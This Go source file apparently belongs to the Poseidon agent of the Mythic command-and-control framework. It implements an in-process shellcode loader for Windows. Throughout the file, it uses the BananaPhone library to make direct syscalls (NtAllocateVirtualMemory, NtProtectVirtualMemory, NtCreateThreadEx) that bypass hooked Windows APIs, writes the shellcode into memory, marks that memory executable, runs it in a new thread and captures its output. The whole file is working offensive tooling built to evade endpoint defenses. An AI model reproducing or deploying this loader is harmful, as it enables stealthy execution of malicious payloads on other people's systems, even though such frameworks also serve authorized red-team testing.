//go:build windows
// +build windows

package execute_assembly

import (
	// Standard
	"errors"
	"fmt"
	"syscall"
	"unsafe"

	// External
	bananaphone "github.com/C-Sto/BananaPhone/pkg/BananaPhone"

	// Poseidon
	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/io"
)

func executeShellcode(sc []byte) (string, error) {

	err := io.RedirectStdoutStderr()
	if err != nil {
		return "", err
	}

	err = run(sc)
	if err != nil {
		return "", err
	}

	stdout, stderr, err := io.ReadStdoutStderr()
	if err != nil {
		return "", err
	}

	err = io.RestoreStdoutStderr()
	if err != nil {
		return "", err
	}

	// Cleanup
	out := fmt.Sprintf("\nout:\n%s\nerr:\n%s\n", stdout, stderr)
	return out, nil
}

func run(shellcode []byte) error {
	bp, e := bananaphone.NewBananaPhone(bananaphone.AutoBananaPhoneMode)
	if e != nil {
		fmt.Println(e)
		return errors.New("failed to load bananaphone")
	}

	//resolve the functions and extract the syscalls
	alloc, e := bp.GetSysID("NtAllocateVirtualMemory")
	if e != nil {
		return errors.New("failed to resolve NtAllocateVirtualMemory SysID")
	}

	protect, e := bp.GetSysID("NtProtectVirtualMemory")
	if e != nil {
		return errors.New("failed to resolve NtProtectVirtualMemory SysID")
	}
	createthread, e := bp.GetSysID("NtCreateThreadEx")
	if e != nil {
		return errors.New("failed to resolve NtCreateThreadEx")
	}

	err := createThread(shellcode, uintptr(0xffffffffffffffff), alloc, protect, createthread)
	if err != nil {
		return err
	}
	return nil
}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16) error {

	const (
		thisThread = uintptr(0xffffffffffffffff) //special macro that says 'use this thread/process' when provided as a handle.
		memCommit  = uintptr(0x00001000)
		memreserve = uintptr(0x00002000)
	)

	var baseA uintptr
	regionsize := uintptr(len(shellcode))
	r1, r := bananaphone.Syscall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(memCommit|memreserve),
		syscall.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return errors.New("NtAllocateVirtualMemory failed")
	}

	//write memory
	bananaphone.WriteMemory(shellcode, baseA)

	var oldprotect uintptr
	r1, r = bananaphone.Syscall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return errors.New("NtProtectVirtualMemory failed")
	}

	var hhosthread uintptr
	r1, r = bananaphone.Syscall(
		NtCreateThreadExSysid,                //NtCreateThreadEx
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.WaitForSingleObject(syscall.Handle(hhosthread), 0xffffffff)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return errors.New("NtCreateThreadEx failed")
	}

	return nil
}
